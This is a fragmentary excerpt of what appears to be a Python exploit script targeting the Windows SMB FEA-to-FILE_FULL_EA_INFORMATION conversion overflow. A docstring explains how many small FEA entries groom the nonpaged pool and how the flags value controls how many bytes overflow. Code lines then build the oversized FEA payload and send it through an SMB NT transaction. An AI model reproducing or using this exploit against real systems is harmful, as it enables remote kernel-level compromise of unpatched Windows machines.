...
A server need to convert FEA to FILE_FULL_EA_INFORMATION. FEA is byte aligned while FILE_FULL_EA_INFORMATION is DWORD 
aligned.
...
From last example, smallest FEA size is 5 bytes. When it is converted to FILE_FULL_EA_INFORMATION, a buffer size is 
12 bytes.With many small FEA entries, a server need to allocate buffer for FILE_FULL_EA_INFORMATION entries much larger 
than input. This is helpful to control the size of vulnerable nonpaged pool.

A FEA flags value is another important value in exploitation. Only 0 and 0x80 is valid flags. Before converting FEA to
FILE_FULL_EA_INFORMATION, the flags is checked first. If the flags is invalid, the converting process is stopped. 
So we can use the flags value to controll how many bytes we want to overflow.
'''
...
payload += pack('<BBH', 0, 0, 0xc003) + b'A'*0xc004  # FEA
...
payload += pack('<BBH', 0, 0, 0xcc00) + b'B'*0x4000
...
conn.send_nt_trans(2, setup=pack('<H', TRANS2_OPEN2), mid=mid, param=b'\x00'*30,
				   data=payload[:1000], totalDataCount=len(payload))
